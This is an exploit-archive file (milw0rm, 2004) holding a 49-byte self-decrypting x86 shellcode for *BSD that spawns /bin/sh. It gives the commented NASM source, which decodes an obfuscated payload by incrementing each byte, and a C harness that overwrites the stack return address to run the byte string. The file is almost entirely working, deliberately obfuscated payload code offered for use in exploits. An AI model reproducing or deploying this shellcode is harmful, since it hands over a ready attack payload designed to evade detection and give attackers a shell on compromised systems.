/* Self decripting (dec/inc) shellcode executes /bin/sh
   Size  49 bytes
   OS	   *BSD
  		/rootteam/dev0id	(www.sysworld.net)
			dev0id@uncompiled.com

BITS	32
jmp	short	shellcode
main:
	pop	esi
	xor	ecx,ecx
	mov	cl,28
main_decript:
	inc byte [esi+ecx]
	loop	main_decript
	inc byte [esi]
	push	esi
	ret


shellcode:
call	main

db 	0xea,0x0d,0x5d,0x30,0xbf,0x87,0x45,0x06,0x4f,0x53,0x55,0xaf,0x3a,0x4f,0xcc
db	0x7f,0xe7,0xec,0xfe,0xfe,0xfe,0x2e,0x61,0x68,0x6d,0x2e,0x72,0x67
*/

char shellcode[] =
	"\xeb\x0e\x5e\x31\xc9\xb1\x1c\xfe\x04\x0e\xe2\xfb\xfe\x06\x56"
	"\xc3\xe8\xed\xff\xff\xff\xea\x0d\x5d\x30\xbf\x87\x45\x06\x4f"
	"\x53\x55\xaf\x3a\x4f\xcc\x7f\xe7\xec\xfe\xfe\xfe\x2e\x61\x68"
	"\x6d\x2e\x72\x67";

int
main(void)
{
	int *ret;
	ret = (int*)&ret + 2;
	(*ret) = shellcode;
}

// milw0rm.com [2004-09-26]